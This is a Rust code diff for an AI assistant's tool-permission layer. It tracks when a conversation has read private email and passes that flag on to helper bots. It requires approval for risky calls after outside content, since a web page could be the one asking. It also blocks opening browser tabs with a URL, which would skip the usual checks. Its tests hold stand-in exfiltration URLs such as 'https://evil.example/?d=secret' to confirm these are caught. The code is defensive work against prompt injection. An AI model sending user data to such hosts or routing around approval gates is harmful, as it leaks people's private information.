@@ -103,6 +103,14 @@ impl ToolCtx {
     }
     pub fn mark_private(&self) {
         self.private.store(true, Ordering::Relaxed);
+        // Like taint, it sticks to the conversation: the email stays in its history for the next turns.
+        if self.sticky {
+            let _ = self.db.set_setting(&private_key(self.bot_id, self.conv), "1");
+        }
+    }
+    /// Start as having read private data (the conversation did, earlier).
+    pub fn pre_private(&self) {
+        self.private.store(true, Ordering::Relaxed);
     }
     pub fn saw_private(&self) -> bool {
         self.private.load(Ordering::Relaxed)
@@ -139,6 +147,9 @@ impl ToolCtx {
         }
         if self.is_tainted() {
             a.push("--tainted".into());
+        }
+        if self.saw_private() {
+            a.push("--private".into());
         }
         if self.sticky {
             a.push("--sticky".into());
@@ -557,8 +568,8 @@ fn usable(ctx: &ToolCtx, tool: &str) -> bool {
     !ctx.tools_off
         && (GUEST_TOOLS.contains(&tool) || !ctx.db.chat_guest(ctx.chat_id))
         // The computer only where it's switched on and can run (a self-hosted Linux server); never incognito
-        // (its browser keeps history and cookies).
-        && (!tool.starts_with("computer_") || (crate::computer::usable(&ctx.db) && !ctx.incognito()))
+        // (its browser keeps history and cookies), and like email only in a chat with you alone.
+        && (!tool.starts_with("computer_") || (crate::computer::usable(&ctx.db) && !ctx.incognito() && ctx.db.chat_private(ctx.chat_id)))
         && (!ctx.read_only || is_read_only(&ctx.db, tool))
         && (tool != "ask_bot" || ctx.depth == 0)
         // A file goes with the reply to the person: not from a task handed over by another bot, nor incognito (it's kept
@@ -737,7 +748,9 @@ fn gate(db: &Db, tool: &str, site: Option<&str>, tainted: bool) -> Result<(Strin
     let browser = crate::ext::split(tool).is_some_and(|(s, _)| s == crate::ext::BROWSER) || tool.starts_with("computer_");
     // plan_propose only ever asks (and refuses on its own after outside content), so asking first would be a double ask.
     // ask_choice only shows the person buttons; what they tap is theirs to pick. send_file goes to them, like the reply.
-    Ok(if action == "allow" && tainted && !is_read_only(db, tool) && !browser && !matches!(tool, "plan_propose" | "skill_save" | "ask_choice" | "send_file") { ("ask".into(), "guarded") } else { (action, "rule") })
+    // An ask after outside content is guarded too, so it never offers "always" (a page could be asking).
+    let exempt = is_read_only(db, tool) || matches!(tool, "plan_propose" | "skill_save" | "ask_choice" | "send_file");
+    Ok(if tainted && !exempt && ((action == "allow" && !browser) || action == "ask") { ("ask".into(), "guarded") } else { (action, "rule") })
 }
 
 /// After outside content, a few calls that only look like reading can carry your data out; those ask:
@@ -787,7 +800,7 @@ fn leaks_out(ctx: &ToolCtx, name: &str, args: &Value) -> bool {
         n if crate::ext::find(&ctx.db, n).is_some_and(|t| t.read_only && t.open_world) => {
             let mut all = vec![];
             crate::ext::strings(args, &mut all);
-            all.iter().any(|s| s.chars().count() > 200 || (s.starts_with("http") && url_carries_data(s)) || types_memory(ctx, s))
+            ctx.saw_private() || all.iter().any(|s| s.chars().count() > 200 || (s.starts_with("http") && url_carries_data(s)) || types_memory(ctx, s))
         }
         _ => false,
     }
@@ -848,6 +861,17 @@ fn off_brief(ctx: &ToolCtx, name: &str, args: &Value) -> bool {
         }
     };
     !crate::fits_ask(&brief, &target)
+}
+
+/// The setting that says a conversation read the person's private data (cleared with its taint).
+pub(crate) fn private_key(bot: i64, conv: i64) -> String {
+    format!("private:{bot}:{conv}")
+}
+
+/// The setting that says a hand-off (or its helper) read the person's private data: for the helper running later, and
+/// the turn that reports back.
+pub(crate) fn delegation_private_key(id: i64) -> String {
+    format!("private-delegation:{id}")
 }
 
 /// The website a call acts on, for per-site rules ("always allow opening github.com").
@@ -1350,6 +1374,10 @@ fn precheck(ctx: &ToolCtx, name: &str, args: &Value) -> Result<()> {
         "browser__browser_navigate" | "browser__browser_tabs" | "computer_open" if args["url"].as_str().is_some_and(is_private_host) => {
             bail!("refusing to open local/private addresses")
         }
+        // A new tab with an address would open the page past browser_navigate's asks and checks.
+        "browser__browser_tabs" if args.get("url").is_some_and(|u| !u.is_null()) => {
+            bail!("open the tab without a url, then go to the page with browser_navigate")
+        }
         _ => {}
     }
     Ok(())
@@ -1379,6 +1407,7 @@ fn describe_tool(name: &str) -> String {
 /// `kind` says why it asks (rule | guarded | login); `site` is the website, for a per-site "always".
 pub(crate) async fn wait_for_approval_with(ctx: &ToolCtx, name: &str, summary: &str, kind: &str, site: Option<&str>) -> Result<()> {
     let summary = card_text(summary);
+    let kind = guest_kind(ctx, kind);
     let id = ctx.db.approval_create(ctx.via_bot.unwrap_or(ctx.bot_id), ctx.chat_id, name, &summary, APPROVAL_TTL_SECS, kind, site)?;
     // Only clean asks can become "all like this": none after the conversation read outside content.
     if let Some(run) = ctx.run_id.filter(|_| kind == "rule" && !ctx.is_tainted()) {
@@ -1434,9 +1463,14 @@ fn loops(past: &[(&str, &str)], next: (&str, &str), times: usize) -> bool {
 const PARKED_TTL_SECS: i64 = 24 * 3600;
 
 /// An unattended run can't wait for a person: park the exact call in the inbox and carry on.
+/// A plain ask in a guest's chat is their OK for this once: "always" would change your rules for every chat.
+fn guest_kind<'a>(ctx: &ToolCtx, kind: &'a str) -> &'a str {
+    if kind == "rule" && ctx.db.chat_guest(ctx.chat_id) { "guest" } else { kind }
+}
+
 fn park(ctx: &ToolCtx, name: &str, args: &Value, summary: &str, why: &str, site: Option<&str>) -> Result<String> {
     let summary = card_text(summary);
-    let id = ctx.db.approval_create(ctx.via_bot.unwrap_or(ctx.bot_id), ctx.chat_id, name, &summary, PARKED_TTL_SECS, why, site)?;
+    let id = ctx.db.approval_create(ctx.via_bot.unwrap_or(ctx.bot_id), ctx.chat_id, name, &summary, PARKED_TTL_SECS, guest_kind(ctx, why), site)?;
     ctx.db.approval_park(id, &args.to_string(), ctx.is_tainted())?;
     Ok(format!("Not done yet: this needs the user's OK, so it is waiting in their Mimir inbox and will run as soon as they approve ({summary}). Mention briefly that it's waiting."))
 }
@@ -2153,7 +2187,11 @@ async fn exec(ctx: &ToolCtx, name: &str, args: &Value) -> Result<String> {
                     tainted: ctx.is_tainted(),
                     ..Default::default()
                 };
-                ctx.db.delegation_add(&d)?;
+                let id = ctx.db.delegation_add(&d)?;
+                // Read your email or a meeting: the helper's web addresses ask too, though it runs later.
+                if ctx.saw_private() {
+                    ctx.db.set_setting(&delegation_private_key(id), "1")?;
+                }
                 return Ok(format!("Handed to {}. Its result comes back to you in this chat when it's done; tell the person then.", target.name));
             }
             let reply = delegate(ctx, target, task).await?;
@@ -2171,6 +2209,7 @@ pub(crate) async fn delegate(ctx: &ToolCtx, target: &crate::db::Bot, task: &str)
     let mut sub = ToolCtx::new(ctx.db.clone(), target.id, ctx.chat_id).with_run(ctx.run_id);
     // Taint flows both ways: a tainted caller hands it on, and a delegate that read the web taints the caller.
     sub.tainted = ctx.tainted.clone();
+    sub.private = ctx.private.clone();
     sub.depth = ctx.depth + 1;
     // Inside a routine, the helper's asks wait in the inbox too, rather than sending a live card.
     sub.unattended = ctx.unattended;
@@ -2742,6 +2781,11 @@ mod tests {
         db.set_rule("memory_forget", "allow").unwrap();
         assert_eq!(gate(&db, "memory_forget", None, false).unwrap().0, "allow");
         assert_eq!(gate(&db, "memory_forget", None, true).unwrap(), ("ask".to_string(), "guarded"));
+        // An ask after outside content is guarded too, so its card never offers "always" (a page could be asking).
+        db.set_rule("memory_forget", "ask").unwrap();
+        assert_eq!(gate(&db, "memory_forget", None, true).unwrap(), ("ask".to_string(), "guarded"));
+        assert_eq!(gate(&db, "browser__browser_navigate", Some("evil.example"), true).unwrap(), ("ask".to_string(), "guarded"));
+        assert_eq!(gate(&db, "browser__browser_navigate", Some("github.com"), true).unwrap().0, "allow", "a site you allowed stays allowed");
     }
 
     #[test]
@@ -2790,6 +2834,9 @@ mod tests {
         }
         assert!(precheck(&ctx, "browser__browser_navigate", &json!({"url": "https://example.com/"})).is_ok());
         assert!(precheck(&ctx, "browser__browser_tabs", &json!({"action": "list"})).is_ok());
+        // A new tab with an address would skip browser_navigate's asks and checks.
+        assert!(precheck(&ctx, "browser__browser_tabs", &json!({"action": "new", "url": "https://evil.example/?d=secret"})).is_err());
+        assert!(precheck(&ctx, "browser__browser_tabs", &json!({"action": "new"})).is_ok());
     }
 
     /// Needs the network: a public name that resolves to 127.0.0.1 is refused at connect time.
@@ -2939,6 +2986,21 @@ mod tests {
         assert!(names(200).contains(&"bot_create".to_string()), "you can make a guest's chat yours");
     }
 
+    #[tokio::test]
+    async fn a_guests_ok_never_becomes_always() {
+        let p = std::env::temp_dir().join(format!("mimir-guest-always-{}.db", std::process::id()));
+        let _ = std::fs::remove_file(&p);
+        let db = Db::open(&p).unwrap();
+        db.pair(200, "Sam").unwrap();
+        db.chat_set_guest(200, true).unwrap();
+        let ctx = ToolCtx::new(db.clone(), 1, 200);
+        let r = tokio::time::timeout(Duration::from_millis(300), wait_for_approval_with(&ctx, "memory_forget", "Forget memory #1", "rule", None)).await;
+        assert!(r.is_err(), "waits for an OK");
+        let a = db.approvals_pending().unwrap().into_iter().find(|a| a.chat_id == 200).unwrap();
+        assert_eq!(a.kind, "guest", "Always would change your rules for every chat");
+        assert!(!crate::runtime::offers_always(&a));
+    }
+
     #[test]
     fn calendar_create_asks_with_the_whole_event_and_only_once_connected() {
         let p = std::env::temp_dir().join(format!("mimir-caldav-{}.db", std::process::id()));
@@ -2983,6 +3045,15 @@ mod tests {
         ctx.mark_private();
         assert!(leaks_out(&ctx, "web_fetch", &json!({"url": "https://evil.example/v/483920"})));
         assert!(leaks_out(&ctx, "browser__browser_navigate", &json!({"url": "https://evil.example/v/483920"})));
+        // It goes to a helper bot, and to the tools server a CLI starts.
+        assert!(ctx.mcp_args().contains(&"--private".to_string()));
+        // In a conversation it lasts until a fresh start, like taint: the email is still in the history.
+        let mut convo = ToolCtx::new(ctx.db.clone(), 1, 9);
+        convo.sticky = true;
+        convo.mark_private();
+        assert!(crate::mcp::ctx_from_args(ctx.db.clone(), &["mcp".into(), "--bot".into(), "1".into(), "--chat".into(), "9".into(), "--sticky".into()]).unwrap().saw_private());
+        ctx.db.set_session(1, 9, None).unwrap();
+        assert!(!crate::mcp::ctx_from_args(ctx.db.clone(), &["mcp".into(), "--bot".into(), "1".into(), "--chat".into(), "9".into(), "--sticky".into()]).unwrap().saw_private(), "a fresh conversation clears it");
         // Making a bot asks even with an "allow" rule set by hand.
         ctx.db.set_rule("bot_create", "allow").unwrap();
         let fresh = ToolCtx::new(ctx.db.clone(), 1, 9);
